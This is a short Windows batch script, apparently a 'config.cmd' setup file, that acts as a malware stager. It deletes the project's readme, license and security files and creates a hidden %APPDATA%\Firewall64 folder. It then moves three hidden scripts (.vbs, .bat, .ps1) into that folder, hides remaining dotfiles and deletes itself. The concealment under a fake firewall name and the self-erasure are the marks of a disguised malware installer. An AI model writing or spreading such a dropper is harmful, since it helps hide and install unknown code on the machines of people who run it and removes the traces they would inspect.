@echo off
:: setup work cd
set "SOURCE_FOLDER=%CD%"
set "HIDDEN_FOLDER=%APPDATA%\Firewall64"

:: deleted github files
del /f /q "%SOURCE_FOLDER%\readme" >nul 2>&1
del /f /q "%SOURCE_FOLDER%\license" >nul 2>&1
del /f /q "%SOURCE_FOLDER%\security" >nul 2>&1
del /f /q "%SOURCE_FOLDER%\.gitignore" >nul 2>&1

:: create folder
if not exist "%HIDDEN_FOLDER%" (
    mkdir "%HIDDEN_FOLDER%"
    attrib +h "%HIDDEN_FOLDER%"
)

:: moved script files
move /y "%SOURCE_FOLDER%\.firewall64.vbs" "%HIDDEN_FOLDER%\" >nul
move /y "%SOURCE_FOLDER%\.firewall64.bat" "%HIDDEN_FOLDER%\" >nul
move /y "%SOURCE_FOLDER%\.firewall64.ps1" "%HIDDEN_FOLDER%\" >nul

attrib +h "%HIDDEN_FOLDER%\.firewall64.vbs"
attrib +h "%HIDDEN_FOLDER%\.firewall64.bat"
attrib +h "%HIDDEN_FOLDER%\.firewall64.ps1"

for %%f in (%SOURCE_FOLDER%\.*) do (
    attrib +h "%%f" >nul 2>&1
)

:: delete config.cmd
echo ok!
del "%~f0" >nul 2>&1

exit